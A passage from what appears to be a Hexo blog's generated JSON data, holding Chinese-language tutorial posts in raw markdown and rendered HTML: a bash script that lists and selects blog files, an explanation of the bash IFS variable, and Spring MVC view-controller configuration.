class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/bin/bash</div><div class=\"line\"></span></div><div class=\"line\">BASE_PATH=/Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article</div><div class=\"line\">FEATURE=<span class=\"string\">'*.md'</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> [[ <span class=\"variable\">$#</span> -ge 1 &amp;&amp; <span class=\"variable\">$1</span> != <span class=\"string\">'-'</span> ]]</div><div class=\"line\"><span class=\"keyword\">then</span></div><div class=\"line\">\tBASE_PATH=<span class=\"variable\">$1</span></div><div class=\"line\"><span class=\"keyword\">fi</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> [[ <span class=\"variable\">$#</span> -ge 2 &amp;&amp; <span class=\"variable\">$2</span> != <span class=\"string\">'-'</span> ]]</div><div class=\"line\"><span class=\"keyword\">then</span></div><div class=\"line\">\tFEATURE=<span class=\"variable\">$2</span></div><div class=\"line\"><span class=\"keyword\">fi</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"BASE_PATH: <span class=\"variable\">$BASE_PATH</span>\"</span></div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"FEATURE: <span class=\"variable\">$FEATURE</span>\"</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">declare</span> <span class=\"_\">-a</span> files</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 文件遍历</span></div><div class=\"line\"><span class=\"keyword\">function</span> file_traverse &#123;</div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"-----------------------------------------\"</span></div><div class=\"line\">    IFS=$<span class=\"string\">'\\n'</span></div><div class=\"line\">    <span class=\"comment\">#echo -n \"$IFS\" | od -b</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    files=($(find <span class=\"variable\">$BASE_PATH</span> -name <span class=\"string\">\"<span class=\"variable\">$FEATURE</span>\"</span>))</div><div class=\"line\">    <span class=\"keyword\">for</span> str <span class=\"keyword\">in</span> <span class=\"variable\">$&#123;!files[@]&#125;</span></div><div class=\"line\">    <span class=\"keyword\">do</span></div><div class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">\"<span class=\"variable\">$str</span>\\t<span class=\"variable\">$&#123;files[$str]&#125;</span>\"</span></div><div class=\"line\">    <span class=\"keyword\">done</span></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 文件选择</span></div><div class=\"line\"><span class=\"keyword\">function</span> choose_file &#123;</div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"-----------------------------------------\"</span></div><div class=\"line\">    <span class=\"built_in\">read</span> -p <span class=\"string\">\"请通过序号选择文件：\"</span> ids</div><div class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"你选择的序号为：<span class=\"variable\">$&#123;ids[@]&#125;</span>\"</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    IFS=$<span class=\"string\">' \\t'</span></div><div class=\"line\">    <span class=\"keyword\">for</span> id <span class=\"keyword\">in</span> <span class=\"variable\">$&#123;ids[@]&#125;</span></div><div class=\"line\">    <span class=\"keyword\">do</span></div><div class=\"line\">        <span class=\"keyword\">if</span> [ <span class=\"variable\">$id</span> <span class=\"_\">-lt</span> <span class=\"variable\">$&#123;#files[@]&#125;</span> ]</div><div class=\"line\">        <span class=\"keyword\">then</span></div><div class=\"line\">            <span class=\"built_in\">echo</span> <span class=\"string\">\"文件: \"</span><span class=\"variable\">$&#123;files[$id]&#125;</span></div><div class=\"line\">        <span class=\"keyword\">fi</span></div><div class=\"line\">    <span class=\"keyword\">done</span></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">file_traverse</div><div class=\"line\">choose_file</div></pre></td></tr></table></figure>\n<h3 id=\"2-脚本输出\"><a href=\"#2-脚本输出\" class=\"headerlink\" title=\"2. 脚本输出\"></a>2. 脚本输出</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:shell yeshaoting$ sh <span class=\"built_in\">print</span>_blog_file.sh /Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/</div><div class=\"line\">BASE_PATH: /Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/</div><div class=\"line\">FEATURE: *.md</div><div class=\"line\">yerba-buena:shell yeshaoting$ sh <span class=\"built_in\">print</span>_blog_file.sh /Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/</div><div class=\"line\">BASE_PATH: /Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/</div><div class=\"line\">FEATURE: *.md</div><div class=\"line\">-----------------------------------------</div><div class=\"line\">0\t/Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/shell关联数组基本用法.md</div><div class=\"line\">1\t/Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/了解IFS.md</div><div class=\"line\">2\t/Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/遍历博客文章.md</div><div class=\"line\">-----------------------------------------</div><div class=\"line\">请通过序号选择文件：2 0</div><div class=\"line\">你选择的序号为：2 0</div><div class=\"line\">文件: /Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/遍历博客文章.md</div><div class=\"line\">文件: /Users/yeshaoting/java/workspace/github/hexo-blog/<span class=\"built_in\">source</span>/_posts/article/shell/shell关联数组基本用法.md</div></pre></td></tr></table></figure>"},{"title":"了解IFS","date":"2016-02-01T09:37:00.000Z","_content":"\n<img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" />\n\n\n## 一、介绍\n内部字段分隔符IFS用作文本分隔符，用于将分隔文本成一个个词。默认的分隔符为空格、制表符以及换行。\n\n通过命令`man bash`可以查看到bash的帮助文档，其中有一段内容如下：\n> The Internal Field Separator that is used for word splitting after expansion and to  split lines into words with the read builtin command.\nThe default value is `<space><tab><newline>`.\n\n\n## 二、相关知识\n\n### 1. IFS内容查看\n由于IFS默认包含的字符都是非可见字符，所以需要将字符内容转换成ASCII码或者八进制等查看。\n``` bash\necho $IFS | od -a (Output named characters.)\necho $IFS | od -b (Output octal bytes.)\necho $IFS | od -c (Output C-style escaped characters.)\necho $IFS | od -x (Output hexadecimal bytes.)\n```\n\n### 2. 自定义IFS\n一般情况，修改IFS只需给IFS这个全局变量赋值即可。\n例如：设置默认分隔符为冒号`IFS=.`\n\n特别地，对于空格、\\n，\\t等特殊字符或转义字符需要进行转义处理，如：`IFS=$'\\n'`。\n\n\n## 三、应用实例\n\n### 1. 脚本\n``` bash\n#!/bin/bash\n\nstr=\"172.30.29.173\"\narr=($str)\necho -e \"默认分隔>> 长度：${#arr[@]} 内容：${arr[@]}\"\n\nIFS=.\narr=($str)\necho -e \"冒号分隔>> 长度：${#arr[@]} 内容：${arr[@]}\"\n\nstr=\"172 30.29 173\"\nIFS=$' '\narr=($str)\necho -e \"空格分隔>> 长度：${#arr[@]} 内容：${arr[@]}\"\n```\n\n### 2. 输出\n``` bash\nyerba-buena:tmp yeshaoting$ sh ifs.sh\n默认分隔>> 长度：1 内容：172.30.29.173\n冒号分隔>> 长度：4 内容：172 30 29 173\n空格分隔>> 长度：3 内容：172 30.29 173\n```\n\n\n## 四、参考文档\n1. [SHELL中的IFS详解](http://smilejay.com/2011/12/bash_ifs/)\n2. [[Shell学习笔记] 内部字段分隔符IFS、脚本调试DEBUG](http://www.1987.name/205.html)\n3. [Shell中的IFS解惑](http://blog.csdn.net/whuslei/article/details/7187639)\n4. [What is the meaning of IFS=$'\\n' in bash scripting ?](http://unix.stackexchange.com/questions/184863/what-is-the-meaning-of-ifs-n-in-bash-scripting)","source":"_posts/article/shell/了解IFS.md","raw":"title: 了解IFS\ntags:\n  - 实践\n  - shell\ncategories:\n  - 系统脚本\ndate: 2016-02-01 17:37:00\n---\n\n<img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" />\n\n\n## 一、介绍\n内部字段分隔符IFS用作文本分隔符，用于将分隔文本成一个个词。默认的分隔符为空格、制表符以及换行。\n\n通过命令`man bash`可以查看到bash的帮助文档，其中有一段内容如下：\n> The Internal Field Separator that is used for word splitting after expansion and to  split lines into words with the read builtin command.\nThe default value is `<space><tab><newline>`.\n\n\n## 二、相关知识\n\n### 1. IFS内容查看\n由于IFS默认包含的字符都是非可见字符，所以需要将字符内容转换成ASCII码或者八进制等查看。\n``` bash\necho $IFS | od -a (Output named characters.)\necho $IFS | od -b (Output octal bytes.)\necho $IFS | od -c (Output C-style escaped characters.)\necho $IFS | od -x (Output hexadecimal bytes.)\n```\n\n### 2. 自定义IFS\n一般情况，修改IFS只需给IFS这个全局变量赋值即可。\n例如：设置默认分隔符为冒号`IFS=.`\n\n特别地，对于空格、\\n，\\t等特殊字符或转义字符需要进行转义处理，如：`IFS=$'\\n'`。\n\n\n## 三、应用实例\n\n### 1. 脚本\n``` bash\n#!/bin/bash\n\nstr=\"172.30.29.173\"\narr=($str)\necho -e \"默认分隔>> 长度：${#arr[@]} 内容：${arr[@]}\"\n\nIFS=.\narr=($str)\necho -e \"冒号分隔>> 长度：${#arr[@]} 内容：${arr[@]}\"\n\nstr=\"172 30.29 173\"\nIFS=$' '\narr=($str)\necho -e \"空格分隔>> 长度：${#arr[@]} 内容：${arr[@]}\"\n```\n\n### 2. 输出\n``` bash\nyerba-buena:tmp yeshaoting$ sh ifs.sh\n默认分隔>> 长度：1 内容：172.30.29.173\n冒号分隔>> 长度：4 内容：172 30 29 173\n空格分隔>> 长度：3 内容：172 30.29 173\n```\n\n\n## 四、参考文档\n1. [SHELL中的IFS详解](http://smilejay.com/2011/12/bash_ifs/)\n2. [[Shell学习笔记] 内部字段分隔符IFS、脚本调试DEBUG](http://www.1987.name/205.html)\n3. [Shell中的IFS解惑](http://blog.csdn.net/whuslei/article/details/7187639)\n4. [What is the meaning of IFS=$'\\n' in bash scripting ?](http://unix.stackexchange.com/questions/184863/what-is-the-meaning-of-ifs-n-in-bash-scripting)","slug":"article/shell/了解IFS","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxtu005n5nbt1hlnr2j0","content":"<p><img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、介绍\"><a href=\"#一、介绍\" class=\"headerlink\" title=\"一、介绍\"></a>一、介绍</h2><p>内部字段分隔符IFS用作文本分隔符，用于将分隔文本成一个个词。默认的分隔符为空格、制表符以及换行。</p>\n<p>通过命令<code>man bash</code>可以查看到bash的帮助文档，其中有一段内容如下：</p>\n<blockquote>\n<p>The Internal Field Separator that is used for word splitting after expansion and to  split lines into words with the read builtin command.<br>The default value is <code>&lt;space&gt;&lt;tab&gt;&lt;newline&gt;</code>.</p>\n</blockquote>\n<h2 id=\"二、相关知识\"><a href=\"#二、相关知识\" class=\"headerlink\" title=\"二、相关知识\"></a>二、相关知识</h2><h3 id=\"1-IFS内容查看\"><a href=\"#1-IFS内容查看\" class=\"headerlink\" title=\"1. IFS内容查看\"></a>1. IFS内容查看</h3><p>由于IFS默认包含的字符都是非可见字符，所以需要将字符内容转换成ASCII码或者八进制等查看。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$IFS</span> | od <span class=\"_\">-a</span> (Output named characters.)</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$IFS</span> | od -b (Output octal bytes.)</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$IFS</span> | od -c (Output C-style escaped characters.)</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$IFS</span> | od -x (Output hexadecimal bytes.)</div></pre></td></tr></table></figure></p>\n<h3 id=\"2-自定义IFS\"><a href=\"#2-自定义IFS\" class=\"headerlink\" title=\"2. 自定义IFS\"></a>2. 自定义IFS</h3><p>一般情况，修改IFS只需给IFS这个全局变量赋值即可。<br>例如：设置默认分隔符为冒号<code>IFS=.</code></p>\n<p>特别地，对于空格、\\n，\\t等特殊字符或转义字符需要进行转义处理，如：<code>IFS=$&#39;\\n&#39;</code>。</p>\n<h2 id=\"三、应用实例\"><a href=\"#三、应用实例\" class=\"headerlink\" title=\"三、应用实例\"></a>三、应用实例</h2><h3 id=\"1-脚本\"><a href=\"#1-脚本\" class=\"headerlink\" title=\"1. 脚本\"></a>1. 脚本</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/bin/bash</span></div><div class=\"line\"></div><div class=\"line\">str=<span class=\"string\">\"172.30.29.173\"</span></div><div class=\"line\">arr=(<span class=\"variable\">$str</span>)</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">\"默认分隔&gt;&gt; 长度：<span class=\"variable\">$&#123;#arr[@]&#125;</span> 内容：<span class=\"variable\">$&#123;arr[@]&#125;</span>\"</span></div><div class=\"line\"></div><div class=\"line\">IFS=.</div><div class=\"line\">arr=(<span class=\"variable\">$str</span>)</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">\"冒号分隔&gt;&gt; 长度：<span class=\"variable\">$&#123;#arr[@]&#125;</span> 内容：<span class=\"variable\">$&#123;arr[@]&#125;</span>\"</span></div><div class=\"line\"></div><div class=\"line\">str=<span class=\"string\">\"172 30.29 173\"</span></div><div class=\"line\">IFS=$<span class=\"string\">' '</span></div><div class=\"line\">arr=(<span class=\"variable\">$str</span>)</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">\"空格分隔&gt;&gt; 长度：<span class=\"variable\">$&#123;#arr[@]&#125;</span> 内容：<span class=\"variable\">$&#123;arr[@]&#125;</span>\"</span></div></pre></td></tr></table></figure>\n<h3 id=\"2-输出\"><a href=\"#2-输出\" class=\"headerlink\" title=\"2. 输出\"></a>2. 输出</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:tmp yeshaoting$ sh ifs.sh</div><div class=\"line\">默认分隔&gt;&gt; 长度：1 内容：172.30.29.173</div><div class=\"line\">冒号分隔&gt;&gt; 长度：4 内容：172 30 29 173</div><div class=\"line\">空格分隔&gt;&gt; 长度：3 内容：172 30.29 173</div></pre></td></tr></table></figure>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><ol>\n<li><a href=\"http://smilejay.com/2011/12/bash_ifs/\" target=\"_blank\" rel=\"external\">SHELL中的IFS详解</a></li>\n<li><a href=\"http://www.1987.name/205.html\" target=\"_blank\" rel=\"external\">[Shell学习笔记] 内部字段分隔符IFS、脚本调试DEBUG</a></li>\n<li><a href=\"http://blog.csdn.net/whuslei/article/details/7187639\" target=\"_blank\" rel=\"external\">Shell中的IFS解惑</a></li>\n<li><a href=\"http://unix.stackexchange.com/questions/184863/what-is-the-meaning-of-ifs-n-in-bash-scripting\" target=\"_blank\" rel=\"external\">What is the meaning of IFS=$’\\n’ in bash scripting ?</a></li>\n</ol>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/bash.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、介绍\"><a href=\"#一、介绍\" class=\"headerlink\" title=\"一、介绍\"></a>一、介绍</h2><p>内部字段分隔符IFS用作文本分隔符，用于将分隔文本成一个个词。默认的分隔符为空格、制表符以及换行。</p>\n<p>通过命令<code>man bash</code>可以查看到bash的帮助文档，其中有一段内容如下：</p>\n<blockquote>\n<p>The Internal Field Separator that is used for word splitting after expansion and to  split lines into words with the read builtin command.<br>The default value is <code>&lt;space&gt;&lt;tab&gt;&lt;newline&gt;</code>.</p>\n</blockquote>\n<h2 id=\"二、相关知识\"><a href=\"#二、相关知识\" class=\"headerlink\" title=\"二、相关知识\"></a>二、相关知识</h2><h3 id=\"1-IFS内容查看\"><a href=\"#1-IFS内容查看\" class=\"headerlink\" title=\"1. IFS内容查看\"></a>1. IFS内容查看</h3><p>由于IFS默认包含的字符都是非可见字符，所以需要将字符内容转换成ASCII码或者八进制等查看。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$IFS</span> | od <span class=\"_\">-a</span> (Output named characters.)</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$IFS</span> | od -b (Output octal bytes.)</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$IFS</span> | od -c (Output C-style escaped characters.)</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"variable\">$IFS</span> | od -x (Output hexadecimal bytes.)</div></pre></td></tr></table></figure></p>\n<h3 id=\"2-自定义IFS\"><a href=\"#2-自定义IFS\" class=\"headerlink\" title=\"2. 自定义IFS\"></a>2. 自定义IFS</h3><p>一般情况，修改IFS只需给IFS这个全局变量赋值即可。<br>例如：设置默认分隔符为冒号<code>IFS=.</code></p>\n<p>特别地，对于空格、\\n，\\t等特殊字符或转义字符需要进行转义处理，如：<code>IFS=$&#39;\\n&#39;</code>。</p>\n<h2 id=\"三、应用实例\"><a href=\"#三、应用实例\" class=\"headerlink\" title=\"三、应用实例\"></a>三、应用实例</h2><h3 id=\"1-脚本\"><a href=\"#1-脚本\" class=\"headerlink\" title=\"1. 脚本\"></a>1. 脚本</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/bin/bash</div><div class=\"line\"></span></div><div class=\"line\">str=<span class=\"string\">\"172.30.29.173\"</span></div><div class=\"line\">arr=(<span class=\"variable\">$str</span>)</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">\"默认分隔&gt;&gt; 长度：<span class=\"variable\">$&#123;#arr[@]&#125;</span> 内容：<span class=\"variable\">$&#123;arr[@]&#125;</span>\"</span></div><div class=\"line\"></div><div class=\"line\">IFS=.</div><div class=\"line\">arr=(<span class=\"variable\">$str</span>)</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">\"冒号分隔&gt;&gt; 长度：<span class=\"variable\">$&#123;#arr[@]&#125;</span> 内容：<span class=\"variable\">$&#123;arr[@]&#125;</span>\"</span></div><div class=\"line\"></div><div class=\"line\">str=<span class=\"string\">\"172 30.29 173\"</span></div><div class=\"line\">IFS=$<span class=\"string\">' '</span></div><div class=\"line\">arr=(<span class=\"variable\">$str</span>)</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"_\">-e</span> <span class=\"string\">\"空格分隔&gt;&gt; 长度：<span class=\"variable\">$&#123;#arr[@]&#125;</span> 内容：<span class=\"variable\">$&#123;arr[@]&#125;</span>\"</span></div></pre></td></tr></table></figure>\n<h3 id=\"2-输出\"><a href=\"#2-输出\" class=\"headerlink\" title=\"2. 输出\"></a>2. 输出</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:tmp yeshaoting$ sh ifs.sh</div><div class=\"line\">默认分隔&gt;&gt; 长度：1 内容：172.30.29.173</div><div class=\"line\">冒号分隔&gt;&gt; 长度：4 内容：172 30 29 173</div><div class=\"line\">空格分隔&gt;&gt; 长度：3 内容：172 30.29 173</div></pre></td></tr></table></figure>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><ol>\n<li><a href=\"http://smilejay.com/2011/12/bash_ifs/\">SHELL中的IFS详解</a></li>\n<li><a href=\"http://www.1987.name/205.html\">[Shell学习笔记] 内部字段分隔符IFS、脚本调试DEBUG</a></li>\n<li><a href=\"http://blog.csdn.net/whuslei/article/details/7187639\">Shell中的IFS解惑</a></li>\n<li><a href=\"http://unix.stackexchange.com/questions/184863/what-is-the-meaning-of-ifs-n-in-bash-scripting\">What is the meaning of IFS=$’\\n’ in bash scripting ?</a></li>\n</ol>\n"},{"title":"mvc-view-controller用法","date":"2016-02-28T05:57:00.000Z","_content":"\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n## 一、重定向\n``` xml\n<mvc:view-controller path=\"/\" view-name=\"redirect:/admin/index\"/>\n```\n说明：即如果当前路径是/，则重定向到/admin/index\n\n\n## 二、view name\n```\n<mvc:view-controller path=\"/\" view-name=\"admin/index\"/>\n```\n如果当前路径是/，则交给相应的视图解析器直接解析为视图\n如：\n``` xml\n<bean id=\"defaultViewResolver\" class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\" p:order=\"2\">\n\t<property name=\"viewClass\" value=\"org.springframework.web.servlet.view.JstlView\"/>\n\t<property name=\"contentType\" value=\"text/html\"/>\n\t<property name=\"prefix\" value=\"/WEB-INF/jsp/\"/>\n\t<property name=\"suffix\" value=\".jsp\"/>\n</bean>\n```\n则得到的视图是：/WEB-INF/jsp/admin/index.jsp\n\n\n## 三、参考\nhttp://www.iteye.com/topic/1129445","source":"_posts/article/spring/mvc-view-controller用法.md","raw":"title: mvc-view-controller用法\ntags:\n  - spring\n  - java\ncategories:\n  - 后端开发\ndate: 2016-02-28 13:57:00\n---\n\n<img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" />\n\n\n## 一、重定向\n``` xml\n<mvc:view-controller path=\"/\" view-name=\"redirect:/admin/index\"/>\n```\n说明：即如果当前路径是/，则重定向到/admin/index\n\n\n## 二、view name\n```\n<mvc:view-controller path=\"/\" view-name=\"admin/index\"/>\n```\n如果当前路径是/，则交给相应的视图解析器直接解析为视图\n如：\n``` xml\n<bean id=\"defaultViewResolver\" class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\" p:order=\"2\">\n\t<property name=\"viewClass\" value=\"org.springframework.web.servlet.view.JstlView\"/>\n\t<property name=\"contentType\" value=\"text/html\"/>\n\t<property name=\"prefix\" value=\"/WEB-INF/jsp/\"/>\n\t<property name=\"suffix\" value=\".jsp\"/>\n</bean>\n```\n则得到的视图是：/WEB-INF/jsp/admin/index.jsp\n\n\n## 三、参考\nhttp://www.iteye.com/topic/1129445","slug":"article/spring/mvc-view-controller用法","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxty005q5nbthlho55tl","content":"<p><img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、重定向\"><a href=\"#一、重定向\" class=\"headerlink\" title=\"一、重定向\"></a>一、重定向</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">mvc:view-controller</span> <span class=\"attr\">path</span>=<span class=\"string\">\"/\"</span> <span class=\"attr\">view-name</span>=<span class=\"string\">\"redirect:/admin/index\"</span>/&gt;</span></div></pre></td></tr></table></figure>\n<p>说明：即如果当前路径是/，则重定向到/admin/index</p>\n<h2 id=\"二、view-name\"><a href=\"#二、view-name\" class=\"headerlink\" title=\"二、view name\"></a>二、view name</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;mvc:view-controller path=&quot;/&quot; view-name=&quot;admin/index&quot;/&gt;</div></pre></td></tr></table></figure>\n<p>如果当前路径是/，则交给相应的视图解析器直接解析为视图<br>如：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">bean</span> <span class=\"attr\">id</span>=<span class=\"string\">\"defaultViewResolver\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"org.springframework.web.servlet.view.InternalResourceViewResolver\"</span> <span class=\"attr\">p:order</span>=<span class=\"string\">\"2\"</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewClass\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"org.springframework.web.servlet.view.JstlView\"</span>/&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"contentType\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"text/html\"</span>/&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"prefix\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"/WEB-INF/jsp/\"</span>/&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">\"suffix\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\".jsp\"</span>/&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">bean</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>则得到的视图是：/WEB-INF/jsp/admin/index.jsp</p>\n<h2 id=\"三、参考\"><a href=\"#三、参考\" class=\"headerlink\" title=\"三、参考\"></a>三、参考</h2><p><a href=\"http://www.iteye.com/topic/1129445\" target=\"_blank\" rel=\"external\">http://www.iteye.com/topic/1129445</a></p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/spring.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、重定向\"><a href=\"#一、重定向\" class=\"headerlink\" title=\"一、重定向\"></a>一、重定向</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">mvc:view-controller</span> <span class=\"attr\">path</span>=<span class=\"string\">\"/\"</span> <span class=\"attr\">view-name</span>=<span class=\"string\">\"redirect:/admin/index\"</span>/&gt;</span></div></pre></td></tr></table></figure>\n<p>说明：即如果当前路径是/，则重定向到/admin/index</p>\n<h2 id=\"二、view-name\"><a href=\"#二、view-name\" class=\"headerlink\" title=\"二、view name\"></a>二、view name</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;mvc:view-controller path=&quot;/&quot; 